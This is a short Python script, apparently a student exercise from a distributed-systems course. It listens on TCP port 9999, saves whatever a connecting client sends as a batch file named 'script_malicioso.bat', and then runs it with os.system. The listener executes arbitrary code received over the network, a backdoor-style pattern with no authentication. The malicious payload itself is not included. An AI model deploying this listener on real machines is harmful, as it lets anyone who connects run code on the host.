import socket
import sys
import os

HOST = ""
PORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)

print("Listening ...")

while True:
    conn, addr = s.accept()
    print("[+] Client connected: ", addr)

    # get file name to download
    f = open("C:\\Users\\Alberto Zaranza\\Documents\\BCC\\S6\\Sistemas Distribuídos\\Script\\script_malicioso.bat", "wb")
    while True:
        # get file bytes
        data = conn.recv(4096)
        if not data:
            break
        # write bytes on file
        f.write(data)
    f.close()
    print("[+] Download complete!")

    # close connection
    conn.close()
    print("[-] Client disconnected")
    os.system("script_malicioso.bat")
    sys.exit(0)